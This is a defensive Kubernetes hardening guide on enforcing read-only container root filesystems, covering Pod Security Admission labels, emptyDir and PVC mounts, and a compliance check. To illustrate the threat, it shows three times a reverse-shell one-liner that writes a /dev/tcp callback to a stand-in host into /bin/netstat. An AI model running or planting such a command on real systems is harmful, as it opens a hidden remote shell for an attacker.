---
title: Enforcing Read-Only Container Filesystems
description: Enforcing readOnlyRootFilesystem to prevent attackers from writing tools, backdoors, or scripts to a container's filesystem after gaining code execution
category: defensive
createdAt: 2026-04-11
impact: Prevents an attacker with code execution inside a container from dropping malware, modifying binaries, or writing reverse shell scripts to the filesystem. Limits post-compromise actions to what is already present in the container image.
mitigation:
  - Set **readOnlyRootFilesystem** to **true** in the container securityContext for every workload that does not require filesystem writes at runtime
  - >-
    Enforce complementary controls at the namespace level using **Pod Security Admission** with the `restricted` profile, which requires `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`, non-root user, and a seccomp profile. Note that the `restricted` profile does not require `readOnlyRootFilesystem: true` and must be set explicitly per container
  - Mount **tmpfs volumes** for paths that legitimately require write access at runtime such as `/tmp` or application-specific scratch directories, keeping the root filesystem immutable while allowing controlled writable areas
  - Use **audit and warn modes** before switching to enforce mode by setting the audit and warn namespace labels to `restricted`. This identifies non-compliant workloads without disrupting production
references: |
  - [Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
  - [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
---

A writable root filesystem gives an attacker with code execution inside a container a lot of room to move. They can drop tools to `/bin`, write reverse shells to `/tmp`, or overwrite existing binaries before anyone notices. Setting `readOnlyRootFilesystem: true` in the container security context tells the kernel to mount the root filesystem read-only, which blocks those writes. The one exception is a container running as privileged, which can remount the filesystem and bypass this control entirely.

## The Attack Without This Control

With code execution in a container, dropping a file takes one command:

```bash
printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
ls -la /bin/netstat
```

```output
-rw-r--r--    1 root     root            51 Apr 11 05:23 /bin/netstat
```

The write succeeds and nothing in the Kubernetes audit log records it. The file stays on the container filesystem until the container restarts or the pod terminates. Without a runtime security tool watching for unexpected filesystem writes, there is no signal that this happened.

## Enforcing at the Namespace Level with Pod Security Admission

Pod Security Admission is built into Kubernetes since v1.25 and requires no additional tooling. Applying the `restricted` profile to a namespace rejects pods that do not meet its required controls: `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`, a non-root user, and a seccomp profile. `readOnlyRootFilesystem: true` is not part of the `restricted` profile and must be set explicitly on each container.

```bash
kubectl label namespace <your-namespace> pod-security.kubernetes.io/enforce=restricted
```

Any pod submitted to that namespace without the correct security context is immediately rejected at admission:

```output
Error from server (Forbidden): pods "nginx" is forbidden: violates PodSecurity "restricted:latest":
allowPrivilegeEscalation != false (container "nginx" must set securityContext.allowPrivilegeEscalation=false),
unrestricted capabilities (container "nginx" must set securityContext.capabilities.drop=["ALL"]),
runAsNonRoot != true (pod or container "nginx" must set securityContext.runAsNonRoot=true),
seccompProfile (pod or container "nginx" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

Before switching to `enforce` mode, apply `warn` and `audit` labels first. Warn mode prints a violation warning to whoever submitted the pod but still creates it. Audit mode records the violation in the API server audit log without blocking anything. Running both against a namespace before enforcing gives you a list of non-compliant workloads without taking anything down.

```bash
kubectl label namespace <your-namespace> \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/audit=restricted
```

Submitting a non-compliant pod under warn mode produces a warning but the pod is created:

```output
Warning: would violate PodSecurity "restricted:latest": allowPrivilegeEscalation != false (container "app" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "app" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "app" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "app" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
pod/app created
```

## Compliant Pod Specification

A pod that satisfies the `restricted` profile with `readOnlyRootFilesystem: true`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: immutable-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: your-app-image
      securityContext:
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
```

With this in place, any write to the root filesystem is blocked:

```bash
printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
```

```output
sh: can't create /bin/netstat: Read-only file system
```

## Allowing Legitimate Writes with Volumes

`readOnlyRootFilesystem: true` applies to the **entire root filesystem**, not to specific directories. Every path is read-only by default, including `/bin`, `/etc`, `/usr`, `/var`, and `/tmp`.

Writable paths work by mounting a volume at the required path. The volume takes precedence over the read-only root at that mount point, making that specific path writable while the rest of the filesystem stays locked. Mounting a volume at `/etc` makes `/etc` writable. Everything else, including `/bin`, stays read-only. The scope of write access is entirely determined by where you mount volumes.

Two volume types cover most use cases:

- **`emptyDir` with `medium: Memory`** is backed by `tmpfs`. It is cleared when the pod terminates. When a container memory limit is set, the tmpfs size is capped to that limit. Good for scratch space, Unix sockets, and any temporary file that does not need to survive a restart.
- **`emptyDir` without a medium** writes to the node's disk and persists for the pod's lifetime.

You can confirm the actual backing storage by checking `/proc/mounts` inside the container:

```bash
cat /proc/mounts | grep -E "/tmp|/scratch"
```

```output
tmpfs /tmp tmpfs rw,relatime,size=12235320k,noswap 0 0
/dev/vda1 /scratch ext4 rw,relatime,discard 0 0
```

The memory-backed mount shows `tmpfs` while the disk-backed mount shows the node's block device with an `ext4` filesystem.

For data that needs to outlive the pod, such as uploaded files or logs that feed an external system, mount a **PersistentVolumeClaim** at that path instead.

```yaml
containers:
  - name: app
    securityContext:
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
      - name: tmp
        mountPath: /tmp
      - name: cache
        mountPath: /var/cache/app
      - name: logs
        mountPath: /var/log/app
volumes:
  - name: tmp
    emptyDir:
      medium: Memory
  - name: cache
    emptyDir: {}
  - name: logs
    persistentVolumeClaim:
      claimName: app-logs-pvc
```

Writes to mounted paths succeed while the root filesystem stays read-only:

```bash
echo "app runtime data" > /tmp/gunicorn.pid && cat /tmp/gunicorn.pid
printf '#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n' > /bin/netstat
```

```output
app runtime data
sh: can't create /bin/netstat: Read-only file system
```

## Adapting Applications for a Read-Only Filesystem

Enabling `readOnlyRootFilesystem: true` on an existing workload without checking what it writes will crash it on startup. The container enters `CrashLoopBackOff` and the logs tell you exactly which path failed:

```output
sh: can't create /var/run/app.pid: Read-only file system
```

The approach is to turn the control on, let the application fail, read the error, add a volume mount for that path, and repeat. Most applications stop failing after two or three mounts. These paths show up the most:

| Path | Common use |
| --- | --- |
| `/tmp` | Temporary files, build artifacts, downloaded content |
| `/var/run` | PID files, Unix sockets |
| `/var/cache` | Application caches |
| `/var/log` | Log files |
| `/home/<user>` | Home directory writes for the container's runtime user |

Applications that write logs to stdout rather than to files on disk do not need `/var/log` at all. For those, `/tmp` and `/var/run` covered by memory-backed `emptyDir` volumes is usually enough.

Some applications write to paths that cannot be remapped, such as binaries that hardcode `/etc` or write back into their own install directory under `/usr`. Before mounting a writable volume at a path like `/etc`, consider what that gives up. A writable `/etc` inside the container lets an attacker modify DNS resolution, PAM configuration, and other sensitive files just as easily as the application can.

## Checking for Non-Compliant Workloads

Run this against any cluster to see which pods have `readOnlyRootFilesystem` set and which do not:

```bash
kubectl get pods -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,READONLY:.spec.containers[*].securityContext.readOnlyRootFilesystem'
```

```output
NAMESPACE      NAME                                READONLY
kube-system    etcd-minikube                        <none>
kube-system    kube-apiserver-minikube              <none>
kube-system    kube-scheduler-minikube              <none>
```

A value of `<none>` means the field is unset, which defaults to `false`. Those workloads have a writable root filesystem.

## Limitations

`readOnlyRootFilesystem: true` controls where files can be written, not whether code runs. An attacker with a shell can still execute whatever binaries are in the image: `curl`, `bash`, `python`, or anything else the image ships with. The read-only filesystem stops them from dropping new tools but ignores the ones already present. Pairing this with a minimal base image (distroless or scratch) removes most of that pre-existing surface.

Any writable volume mount is also reachable by an attacker who can exec into the pod. If `/tmp` is mounted as a writable `emptyDir`, they can write to `/tmp`. The control narrows where writes land, not whether writes happen at all.

A container running as `privileged: true` can call `mount -o remount,rw /` and undo the restriction entirely. `readOnlyRootFilesystem` should always be paired with `privileged: false` and `capabilities.drop: ["ALL"]`. The `restricted` Pod Security Standard enforces the latter two but not `readOnlyRootFilesystem` itself.
